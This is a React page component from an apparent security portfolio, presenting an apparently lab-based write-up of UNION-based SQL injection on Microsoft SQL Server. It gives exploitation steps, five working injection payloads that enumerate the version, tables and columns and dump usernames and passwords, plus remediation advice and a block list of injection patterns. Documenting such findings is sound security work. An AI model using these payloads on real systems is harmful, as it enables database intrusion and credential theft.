import { ArrowLeft, Shield, AlertTriangle, Code, Target, Zap } from "lucide-react";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import Layout from "@/components/Layout";

const SqlInjectionUnionEnumeration = () => {
  return (
    <Layout>
      <div className="container mx-auto px-4 py-16">
        <Link to="/portfolio">
          <Button variant="ghost" className="mb-8 -ml-4 text-muted-foreground hover:text-accent">
            <ArrowLeft className="mr-2 h-4 w-4" />
            Back to Portfolio
          </Button>
        </Link>

        <header className="mb-12">
          <div className="mb-4 flex flex-wrap gap-2">
            <Badge variant="destructive" className="border-red-500/50 bg-red-500/10 text-red-400">
              Critical
            </Badge>
            <Badge variant="secondary" className="border-accent/20 bg-accent/10 text-accent">
              SQL Injection
            </Badge>
            <Badge variant="secondary" className="border-accent/20 bg-accent/10 text-accent">
              UNION SELECT
            </Badge>
            <Badge variant="secondary" className="border-accent/20 bg-accent/10 text-accent">
              MS SQL Server
            </Badge>
            <Badge variant="secondary" className="border-accent/20 bg-accent/10 text-accent">
              Data Enumeration
            </Badge>
          </div>

          <h1 className="mb-4 text-4xl font-bold tracking-tight">
            SQL Injection – UNION-Based Enumeration on Non-Oracle Databases
          </h1>

          <p className="text-xl text-muted-foreground">
            UNION-based SQL injection enabling complete database enumeration on Microsoft SQL Server backend
          </p>
        </header>

        <div className="mb-12 rounded-lg border border-operator-border bg-card p-6">
          <p className="text-sm leading-relaxed text-muted-foreground">
            The application's category filtering endpoint is vulnerable to UNION-based SQL Injection.
            The category parameter is concatenated directly into an SQL query without sanitization, allowing
            an attacker to modify the intended logic and extract arbitrary database contents including version
            information, complete table structure, and sensitive user credentials from a Microsoft SQL Server backend.
          </p>
        </div>

        <div className="space-y-12">
          <section>
            <div className="mb-6 flex items-center gap-3">
              <Shield className="h-6 w-6 text-accent" />
              <h2 className="text-2xl font-semibold">Overview</h2>
            </div>
            <div className="space-y-4 text-muted-foreground">
              <p>
                The application's category filtering functionality is vulnerable to UNION-based SQL Injection.
                The category parameter is concatenated directly into an SQL query without sanitization, allowing
                an attacker to modify the intended logic and extract arbitrary database contents.
              </p>
              <p>By injecting a crafted UNION SELECT payload, an attacker can:</p>
              <ul className="ml-6 list-disc space-y-2">
                <li>Enumerate the database version (@@version – indicates a Microsoft SQL Server backend)</li>
                <li>List all tables via information_schema.tables</li>
                <li>List columns of specific tables</li>
                <li>Extract sensitive user data including usernames and passwords</li>
              </ul>
              <p>
                This confirms that the backend is running a non-Oracle SQL database (Microsoft SQL Server) and
                exposes its exact version number, patch level, and operating system information.
              </p>
            </div>
          </section>

          <section>
            <div className="mb-6 flex items-center gap-3">
              <Target className="h-6 w-6 text-accent" />
              <h2 className="text-2xl font-semibold">Attack Surface</h2>
            </div>
            <div className="space-y-4 text-muted-foreground">
              <p>Vulnerable parameter:</p>
              <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                <code className="text-sm text-accent">/filter?category=&lt;input&gt;</code>
              </pre>
              <p>Backend query executed:</p>
              <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                <code className="text-sm text-accent">
                  SELECT * FROM products WHERE category = '&lt;input&gt;';
                </code>
              </pre>
              <p>Because the value is inserted directly into the query:</p>
              <ul className="ml-6 list-disc space-y-2">
                <li>Quotes can be broken</li>
                <li>Attacker SQL can be appended</li>
                <li>The backend does not validate column counts or data types</li>
              </ul>
              <p>This makes the endpoint fully vulnerable to UNION-based SQLi.</p>
            </div>
          </section>

          <section>
            <div className="mb-6 flex items-center gap-3">
              <Zap className="h-6 w-6 text-accent" />
              <h2 className="text-2xl font-semibold">Exploitation Steps</h2>
            </div>
            <div className="space-y-4 text-muted-foreground">
              <ol className="ml-6 list-decimal space-y-3">
                <li>Navigate to the home page and select any product category.</li>
                <li>Intercept the request using Burp Suite (recommended).</li>
                <li>Modify the category parameter with injection payloads.</li>
                <li>Use ORDER BY to identify the number of columns.</li>
                <li>Use UNION SELECT to extract system metadata and database contents.</li>
                <li>The response page displays attacker-supplied data instead of normal products.</li>
              </ol>
            </div>
          </section>

          <section>
            <div className="mb-6 flex items-center gap-3">
              <Code className="h-6 w-6 text-accent" />
              <h2 className="text-2xl font-semibold">Payloads Used</h2>
            </div>
            <div className="space-y-6 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">1. Determine number of columns</h3>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">' ORDER BY 2--</code>
                </pre>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">2. Extract SQL Server version</h3>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">' UNION SELECT @@version, NULL--</code>
                </pre>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">3. Enumerate all tables</h3>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">
                    ' UNION SELECT table_name, NULL FROM information_schema.tables--
                  </code>
                </pre>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">4. Enumerate all columns of a chosen table</h3>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">
                    {`' UNION SELECT column_name, NULL FROM information_schema.columns 
  WHERE table_name = 'users_ueqxii'--`}
                  </code>
                </pre>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">5. Dump sensitive data</h3>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">
                    ' UNION SELECT username, password FROM users_ueqxii--
                  </code>
                </pre>
              </div>

              <div className="mt-6 rounded-lg border border-accent/20 bg-accent/5 p-4">
                <h3 className="mb-2 font-semibold text-foreground">Technical Explanation</h3>
                <ul className="ml-6 list-disc space-y-2">
                  <li>
                    <strong>UNION SELECT</strong> merges attacker-controlled query results with the legitimate
                    query output
                  </li>
                  <li>
                    <strong>@@version</strong> returns SQL Server version, build, and OS information
                  </li>
                  <li>
                    <strong>information_schema.tables</strong> and{" "}
                    <strong>information_schema.columns</strong> expose complete database structure
                  </li>
                  <li>
                    The <strong>--</strong> comment truncates the rest of the original SQL query
                  </li>
                  <li>
                    The vulnerable endpoint displays this data directly in the UI, confirming full SQL injection
                    exploitation
                  </li>
                </ul>
              </div>
            </div>
          </section>

          <section>
            <div className="mb-6 flex items-center gap-3">
              <AlertTriangle className="h-6 w-6 text-red-400" />
              <h2 className="text-2xl font-semibold">Impact: Critical</h2>
            </div>
            <div className="space-y-4 text-muted-foreground">
              <p>
                This vulnerability is classified as <strong className="text-red-400">Critical (CVSS 9.8+)</strong>{" "}
                because it enables:
              </p>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">Data Exposure</h3>
                <ul className="ml-6 list-disc space-y-2">
                  <li>Usernames and passwords</li>
                  <li>Complete table structure</li>
                  <li>Internal database schemas</li>
                  <li>All sensitive application data</li>
                </ul>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">System Reconnaissance</h3>
                <ul className="ml-6 list-disc space-y-2">
                  <li>Exact DB version, edition, and patch level</li>
                  <li>Operating system metadata</li>
                  <li>Ability to map known CVEs for targeted attacks</li>
                  <li>Complete database fingerprinting</li>
                </ul>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">Further Exploitation Potential</h3>
                <ul className="ml-6 list-disc space-y-2">
                  <li>Privilege escalation within the database</li>
                  <li>Authentication bypass</li>
                  <li>Remote code execution (version-dependent)</li>
                  <li>Lateral movement across the network</li>
                </ul>
              </div>

              <p className="rounded-lg border border-red-500/20 bg-red-500/5 p-4 text-red-400">
                SQL Injection combined with version disclosure and full schema enumeration massively increases
                risk and lowers attacker complexity. This represents a complete compromise of database
                confidentiality.
              </p>
            </div>
          </section>

          <section>
            <div className="mb-6 flex items-center gap-3">
              <Shield className="h-6 w-6 text-green-400" />
              <h2 className="text-2xl font-semibold">Recommendations / Fixes</h2>
            </div>
            <div className="space-y-6 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  1. Use Parameterized Queries (Prepared Statements)
                </h3>
                <p>Prevent user input from being injected into SQL strings.</p>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  2. Enforce Strict Server-Side Input Validation
                </h3>
                <p>Reject unsafe characters:</p>
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-accent">'  "  ;  --  #  /*  */</code>
                </pre>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">3. Disable Detailed Error Messages</h3>
                <p>Do not expose SQL Server errors, stack traces, or debug information to the client.</p>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">4. Use Least-Privilege Database Accounts</h3>
                <p>The application should NOT have permission to read:</p>
                <ul className="ml-6 list-disc space-y-2">
                  <li>@@version</li>
                  <li>information_schema</li>
                  <li>System metadata tables</li>
                </ul>
              </div>

              <div>
                <h3 className="mb-2 font-semibold text-foreground">5. Add WAF Filtering Rules</h3>
                <p>Block:</p>
                <ul className="ml-6 list-disc space-y-2">
                  <li>UNION SELECT patterns</li>
                  <li>Comment usage (--, /* */)</li>
                  <li>Boolean/time-based injection patterns</li>
                  <li>information_schema access attempts</li>
                </ul>
              </div>
            </div>
          </section>
        </div>
      </div>
    </Layout>
  );
};

export default SqlInjectionUnionEnumeration;
